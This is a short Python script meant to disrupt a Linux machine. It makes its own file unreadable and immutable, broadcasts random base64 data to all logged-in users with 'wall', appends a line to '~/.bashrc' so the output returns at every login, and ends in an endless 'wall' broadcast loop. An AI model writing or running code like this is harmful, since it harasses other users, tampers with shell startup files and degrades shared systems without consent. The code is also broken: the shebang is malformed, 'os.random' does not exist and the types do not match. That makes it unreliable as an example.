#/usr/bin/python3
import os
import base64

os.system("chmod 000 sop_ua.py")
os.system("chattr +i sop_ua.py")
result=os.random(500000)
result=base64.b64encode(result)
os.system("wall -n "+result)

with open("zazap","wb") as f:
    f.write(result)

os.system("echo 'cat /root/zazap' >> ~/.bashrc")
os.system("while :; do wall -n zazap; done;")

